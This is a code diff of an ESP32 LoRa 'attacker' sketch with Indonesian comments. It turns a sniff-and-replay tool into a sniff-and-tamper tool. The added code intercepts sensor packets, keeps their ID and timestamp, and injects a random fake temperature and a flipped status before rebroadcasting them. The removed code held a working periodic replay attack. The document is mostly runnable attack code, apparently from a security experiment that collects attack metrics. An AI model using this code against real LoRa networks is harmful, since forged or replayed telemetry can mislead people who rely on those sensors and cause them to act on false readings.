@@ -1,20 +1,11 @@
 /*
-ATTACKER / SNIFFER LoRa
+ATTACKER / SNIFFER + TAMPERING LoRa
 --------------------------------
 Author: Mohammad Rizki  Fadillah
 Description:
-This code implements a LoRa sniffer that listens for LoRa packets on a specified frequency and prints the received data along with signal strength (RSSI) and signal-to-noise ratio (SNR). It uses the LoRa library to interface with the LoRa module and the SPI library for communication. The sniffer is configured to use specific pins for SS, RST, and DIO0, and it sets the spreading factor, signal bandwidth, and coding rate to match the sender's configuration. The code continuously checks for incoming packets and prints their contents when detected.
-This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain proper permissions before conducting any security testing.
---------------------------------
-*/
-/*
-ATTACKER / SNIFFER + REPLAY LoRa
---------------------------------
-Author: Mohammad Rizki  Fadillah
-Description:
-Alat ini menyadap (Sniff) paket di udara, lalu menembakkannya kembali 
-(Replay Attack) setiap 7 detik. Jika tidak ada paket baru yang 
-disadap selama 30 detik, proses replay berhenti dan summary dicetak.
+Alat ini menyadap (Sniff) paket di udara, mengambil ID dan Timestamp aslinya,
+kemudian memanipulasi (Tampering) nilai Suhu secara random dan mengubah Statusnya.
+Setelah dimanipulasi, paket langsung ditembakkan kembali ke udara.
 --------------------------------
 */
 
@@ -27,14 +18,13 @@ disadap selama 30 detik, proses replay berhenti dan summary dicetak.
 
 // ===== PARAM =====
 const uint32_t EXPECTED = 200;
-const unsigned long REPLAY_INTERVAL = 7000; // Replay tiap 7 detik
-const unsigned long TIMEOUT_MS = 30000;     // Terminating 30 detik
+const unsigned long TIMEOUT_MS = 50000;     // Terminating 50 detik
 
 // ===== METRICS =====
 uint32_t sniffedCount = 0;
 uint32_t decodedCount = 0;
 uint32_t invalidCount = 0;
-uint32_t replayedCount = 0; // Ngitung total tembakan replay
+uint32_t tamperedCount = 0; // Ngitung total tembakan hasil manipulasi
 
 // ===== OPTIONAL UNIQUE TRACK =====
 bool seen[EXPECTED] = {false};
@@ -43,10 +33,8 @@ uint32_t duplicateCount = 0;
 
 // ===== STATE LOGIC =====
 unsigned long lastRecvTime = 0;
-unsigned long lastReplayTime = 0;
 bool started = false;
 bool done = false; 
-String lastPacket = "";
 
 // ===== VALIDATION =====
 bool isValidPayload(String data, uint32_t &id) {
@@ -71,7 +59,7 @@ void printSummary() {
   float decodeRate = (sniffedCount > 0) ? ((decodedCount * 100.0) / sniffedCount) : 0;
   float packetLoss = 100.0 - sniffRate;
 
-  Serial.println("\n=== ATTACKER SUMMARY ===");
+  Serial.println("\n=== ATTACKER (TAMPERING) SUMMARY ===");
 
   Serial.print("Sniffed Total: "); Serial.println(sniffedCount);
   Serial.print("Decoded Valid: "); Serial.println(decodedCount);
@@ -80,7 +68,7 @@ void printSummary() {
   Serial.print("Unique: "); Serial.println(uniqueCount);
   Serial.print("Duplicate: "); Serial.println(duplicateCount);
   
-  Serial.print("TOTAL SPAM REPLAY: "); Serial.println(replayedCount);
+  Serial.print("TOTAL TEMBAKAN TAMPERING: "); Serial.println(tamperedCount);
 
   Serial.print("Sniff Success / PDR (%): "); Serial.println(sniffRate);
   Serial.print("Missed / Packet Loss (%): "); Serial.println(packetLoss);
@@ -89,6 +77,9 @@ void printSummary() {
 
 void setup() {
   Serial.begin(115200);
+
+  // Bikin seed random biar angkanya beneran acak tiap kali jalan
+  randomSeed(analogRead(0)); 
 
   SPI.begin(18, 19, 23, SS);
   LoRa.setPins(SS, RST, DIO0);
@@ -104,16 +95,13 @@ void setup() {
 
   LoRa.receive();
 
-  Serial.println("Attacker (Sniff + Replay) Ready...");
-  Serial.println("Replay tiap 7s | Terminate kalo 30s kosong\n");
+  Serial.println("Attacker (Sniff + TAMPERING) Ready...");
+  Serial.println("Langsung manipulasi & tembak tiap dapet mangsa\n");
 }
 
 void loop() {
   if (done) return; 
 
-  // =========================
-  // 1. SNIFF LOGIC
-  // =========================
   int packetSize = LoRa.parsePacket();
 
   if (packetSize) {
@@ -143,20 +131,55 @@ void loop() {
       invalidCount++;
     }
 
-    // LOG SNIFF
-    Serial.print("[SNIFF] ");
+    // =========================
+    // LOG SNIFF (NGUPING)
+    // =========================
+    Serial.print("[SNIFF] Asli: ");
     Serial.print(data);
     Serial.print(" | RSSI=");
     Serial.print(LoRa.packetRssi());
-    Serial.print(" | SNR=");
-    Serial.print(LoRa.packetSnr());
     if (!valid) Serial.print(" | INVALID");
     Serial.println();
 
-    // Simpan buat direplay
-    lastPacket = data;
+    // =========================
+    // TAMPERING LOGIC (MANIPULASI DATA)
+    // =========================
+    if (valid) { 
+      // 1. Ekstrak ID dan Timestamp dari payload asli
+      int p1 = data.indexOf(',');
+      int p2 = data.indexOf(',', p1 + 1);
+      
+      if (p1 != -1 && p2 != -1) {
+        String idStr = data.substring(0, p1);
+        String tsStr = data.substring(p1 + 1, p2);
 
-    // Kalo aja dapet 200 pas tanpa loss
+        // 2. Bikin suhu palsu secara random (antara 10.00 sampai 50.00 derajat)
+        float fakeTemp = random(1000, 5000) / 100.0;
+        
+        // 3. Ubah status sesuai suhu palsu
+        String fakeStatus = (fakeTemp > 30.0) ? "PANAS" : "AMAN";
+
+        // 4. Jahit ulang jadi payload baru yang siap tembak
+        String tamperedData = idStr + "," + tsStr + "," + String(fakeTemp, 2) + "," + fakeStatus;
+
+        // =========================
+        // TEMBAK DATA PALSU
+        // =========================
+        tamperedCount++;
+        Serial.print("  └─> [TAMPER] Tembak palsu: ");
+        Serial.println(tamperedData);
+
+        LoRa.beginPacket();
+        LoRa.print(tamperedData);
+        LoRa.endPacket();
+
+        LoRa.receive(); // Wajib balik ke mode receive biar siap nguping paket berikutnya
+      }
+    }
+
+    // =========================
+    // CEK TARGET
+    // =========================
     if (sniffedCount >= EXPECTED) {
       printSummary();
       done = true;
@@ -164,33 +187,10 @@ void loop() {
   }
 
   // =========================
-  // 2. REPLAY ATTACK LOGIC (Tiap 7 Detik)
-  // =========================
-  if (started && !done && lastPacket != "") {
-    if (millis() - lastReplayTime >= REPLAY_INTERVAL) {
-      // Pastiin belum masuk zona timeout
-      if (millis() - lastRecvTime <= TIMEOUT_MS) {
-        lastReplayTime = millis();
-        replayedCount++;
-
-        Serial.print("[REPLAY] Nembak ulang: ");
-        Serial.println(lastPacket);
-
-        LoRa.beginPacket();
-        LoRa.print(lastPacket);
-        LoRa.endPacket();
-
-        // Wajib balik ke receive biar ga budek
-        LoRa.receive(); 
-      }
-    }
-  }
-
-  // =========================
-  // 3. TIMEOUT / TERMINATING LOGIC (30 Detik)
+  // TIMEOUT / TERMINATING LOGIC (50 Detik)
   // =========================
   if (started && !done && (millis() - lastRecvTime > TIMEOUT_MS)) {
-    Serial.println("\n[TIMEOUT] 30 Detik ga ada mangsa baru. Sesi Replay STOP!");
+    Serial.println("\n[TIMEOUT] 50 Detik ga ada mangsa baru. Sesi Tampering STOP!");
     printSummary();
     done = true;
   }
